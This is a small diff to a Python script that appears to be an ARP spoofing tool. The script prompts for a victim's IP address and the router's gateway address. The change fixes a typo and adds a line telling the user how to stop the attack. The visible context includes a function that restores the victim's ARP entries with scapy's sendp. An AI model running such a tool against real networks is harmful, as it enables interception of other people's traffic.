@@ -27,7 +27,8 @@ def restore(victim_mac):
     sendp(packet, count=5, verbose=False)
 
 
-print("you can view the answers to the following quetions by running the comand ipconfig in the victim's terminal")
+print("you can view the answers to the following quetions by running the command ipconfig in the victim's terminal")
+print("to stop the attack, press Ctrl+C")
 victim_ip = input("Enter the IP address of the device you want to attack: ")
 router_ip = input("Enter the default gateway IP address of the network (usually your router's IP): ")
 
